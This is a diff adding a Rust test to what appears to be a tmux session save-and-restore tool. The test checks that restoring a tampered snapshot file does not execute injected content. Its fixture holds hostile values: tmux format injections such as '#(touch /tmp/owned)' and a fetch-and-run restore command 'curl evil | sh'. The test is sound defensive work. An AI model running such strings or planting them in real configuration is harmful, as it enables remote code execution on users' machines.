@@ -389,3 +389,57 @@ fn only_members_of_this_sessions_groups_are_recorded_hidden() {
         "pane-id order, other groups and the placeholder left out"
     );
 }
+
+/// A snapshot is a file on disk. Only what capture writes is put back, a
+/// command in a sidebar other than tmuxy's own widget is offered rather than
+/// run, and nothing it carries reaches `run-shell` as a format.
+#[test]
+fn a_restore_puts_back_only_what_capture_writes() {
+    let mut snapshot = fixture();
+    let window = &mut snapshot.windows[0];
+    window
+        .options
+        .insert("pane-border-format".into(), "#(touch /tmp/owned)".into());
+    window
+        .options
+        .insert(tmux_options::FLOAT_WIDTH.into(), "80".into());
+    window.panes[0]
+        .options
+        .insert("default-command".into(), "evil".into());
+    window.panes[0].scrollback = Some(vec!["#(touch /tmp/owned) #{pane_title}".into()]);
+    snapshot.windows.push(WindowSnapshot {
+        index: 3,
+        name: "__sidebar-right".into(),
+        active: false,
+        layout: "bd23,30x27,0,0,6".into(),
+        window_type: Some("sidebar-right".into()),
+        float_parent_index: None,
+        options: BTreeMap::new(),
+        panes: vec![PaneSnapshot {
+            index: 0,
+            active: true,
+            cwd: "/tmp".into(),
+            command: None,
+            restore_command: Some("curl evil | sh".into()),
+            options: BTreeMap::new(),
+            scrollback: None,
+            offer: None,
+        }],
+    });
+    let lines = joined(&plan(&snapshot, &RestoreOptions::default()));
+    assert!(!lines.iter().any(|l| l.contains("pane-border-format")));
+    assert!(!lines.iter().any(|l| l.contains("default-command")));
+    assert!(lines.iter().any(|l| l.contains(tmux_options::FLOAT_WIDTH)));
+    assert!(!lines.iter().any(|l| l.contains("send-keys -t work:3.0")));
+    assert!(lines
+        .iter()
+        .any(|l| l.starts_with("run: set-option -p -t work:3.0 @tmuxy-ask")));
+    let printf = lines
+        .iter()
+        .find(|l| l.contains("printf"))
+        .expect("the scrollback is printed back");
+    assert!(
+        printf.contains("##(touch /tmp/owned) ##{pane_title}"),
+        "{printf}"
+    );
+}
